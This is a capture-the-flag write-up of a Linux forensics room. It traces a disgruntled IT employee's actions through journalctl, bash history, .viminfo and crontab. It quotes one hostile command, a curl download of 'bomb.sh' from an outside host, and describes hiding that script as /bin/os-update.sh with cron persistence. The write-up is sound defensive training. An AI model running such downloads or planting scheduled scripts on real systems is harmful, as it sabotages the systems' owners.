# Disgruntled – TryHackMe

- Difficulty: easy
- Date: 2026-05-07
- Tags: linux, forensics

## 🧩 Overview

```
Use your Linux forensics knowledge to investigate an incident.
```

## ⚙️ Tools Used

- Linux commands

## Walkthrough

### Task 1 - Introduction

Hey, kid! Good, you're here!

Not sure if you've seen the news, but an employee from the IT department of one of our clients (CyberT) got arrested by the police. The guy was running a successful phishing operation as a side gig.

CyberT wants us to check if this person has done anything malicious to any of their assets. Get set up, grab a cup of coffee, and meet me in the conference room.

### Task 2 - Pre-requisites

This room requires basic knowledge of Linux and is based on the [Forensics](https://tryhackme.com/room/linuxforensics) room. A cheat sheet is attached below, which you can also download by clicking on the blue `Download Task Files` button on the right.

### Task 3 - Nothing suspicious... So far

Here's the machine our disgruntled IT user last worked on. Check if there's anything our client needs to be worried about.

My advice: Look at the privileged commands that were run. That should get you started.

#### Q1: The user installed a package on the machine using elevated privileges. According to the logs, what is the full COMMAND?

The task talks about **a user using privileged commands**.

First, I started by checking which users can run commands as sudo.

```
cat /etc/sudoers
```

<div align="center"><img src="../attachments/Pasted image 20260507215226.png"/></div>

There's more than one way of checking the history of executed commands:
- Read the history file (**~/bash_history**) of each user
 - Review system logs using `journalctl`

```
journalctl -g install
```

<div align="center"><img src="../attachments/Pasted image 20260507215600.png"/></div>

```text
-> /usr/bin/apt install dokuwiki
```

#### Q2: What was the present working directory (PWD) when the previous command was run?

This can also be seen in the output of the command from **Q1**.

```text
/home/cybert
```

### Task 4 - Let's see if you did anything bad

Keep going. Our disgruntled IT was supposed to only install a service on this computer, so look for commands that are unrelated to that.

#### Q1: Which user was created after the package from the previous task was installed?

The package was installed on Dec 28 at 06:17:30.

<div align="center"><img src="../attachments/Pasted image 20260507220740.png"/></div>

```
journalctl --since '2022-12-28' --until '2022-12-29' | grep useradd
```

<div align="center"><img src="../attachments/Pasted image 20260507232049.png"/></div>

```
-> it-admin
```

#### Q2: A user was then later given sudo privileges. When was the sudoers file updated? (Format: Month Day HH:MM:SS)

`visudo` is usually used to edit `/etc/sudoers`.
I've checked the journal for any `visudo` entries.

```
journalctl | grep visudo
```

<div align="center"><img src="../attachments/Pasted image 20260507232724.png"/></div>

The file has been edited shortly after the activities from the previous questions.

```
-> Dec 28 06:27:34
```

#### Q3: A script file was opened using the "vi" text editor. What is the name of this file?

<div align="center"><img src="../attachments/Pasted image 20260507233127.png"/></div>

```
-> bomb.sh
```

### Task 5 - Bomb has been planted. But when and where?

That `bomb.sh` file is a huge red flag! While a file is already incriminating in itself, we still need to find out where it came from and what it contains. The problem is that the file does not exist anymore.

#### Q1: What is the command used that created the file bomb.sh?

In the previous task, the logs showed that the `it-admin` user used `vi` to open the `bomb.sh` script.

I've checked the `.bash_history` file of the `it-admin` user and found the command that downloaded/created `bomb.sh`.

<div align="center"><img src="../attachments/Pasted image 20260507233711.png"/></div>

```
-> curl 10.10.158.38:8080/bomb.sh --output bomb.sh
```

#### Q2: The file was renamed and moved to a different directory. What is the full path of this file now?

The script has been edited with `vi`.
`vi` maintains usage history and metadata in the `.viminfo` file.

I opened that file and found the answer in the `# Command Line History` section.

<div align="center"><img src="../attachments/Pasted image 20260507234216.png"/></div>

```
-> /bin/os-update.sh
```

#### Q3: When was the file from the previous question last modified? (Format: Month Day HH:MM)

I've checked the date of the last modification using the `stat` command.

<div align="center"><img src="../attachments/Pasted image 20260507234343.png"/></div>

```
-> Dec 28 06:29
```

#### Q4: What is the name of the file that will get created when the file from the first question executes?

To see what the script does, I opened it with a text editor:
<div align="center"><img src="../attachments/Pasted image 20260507234432.png"/></div>

```
-> goodbye.txt
```

### Task 6 - Follow the fuse

So we have a file and a motive. The question we now have is: how will this file be executed?

Surely, he wants it to execute at some point?

#### Q1: At what time will the malicious file trigger? (Format: HH:MM AM/PM)

In Linux, `cron` is used to automate tasks. It is also used by malicious actors to establish persistence.

I've read the file at `/etc/crontab` to see if `/bin/os-update.sh` had been added there.

<div align="center"><img src="../attachments/Pasted image 20260507234802.png"/></div>

It's the last entry.

Finally, I used the [crontab.guru](https://crontab.guru/) tool to convert the cron expression:

<div align="center"><img src="../attachments/Pasted image 20260507235000.png"/></div>

```
-> 08:00 AM
```

## 🧠 Lessons Learned

- Linux forensic investigations often rely on correlating multiple artefacts such as `journalctl`, shell history files, cron jobs, and editor logs.
- Privileged command execution logs can reveal malicious administrative activity and persistence mechanisms.
- Text editor artefacts such as `.viminfo` may retain traces of deleted or renamed files.
- Cron jobs are commonly abused by attackers to establish persistence or schedule malicious payload execution.
- User activity timelines can be reconstructed by analysing system logs and file metadata together.

## 🛡️ Mitigation

- Restrict and monitor sudo privileges using the principle of least privilege.
- Enable centralized logging and regularly audit privileged command execution.
- Monitor system directories and cron configurations for unauthorized modifications.
- Implement file integrity monitoring on sensitive system paths such as `/bin`, `/etc`, and cron-related directories.
- Restrict outbound network connections to prevent unauthorized file downloads from external hosts.
- Conduct regular reviews of newly created user accounts and privilege escalations.
- Deploy endpoint detection and response (EDR) solutions capable of identifying persistence mechanisms and suspicious administrative activity.
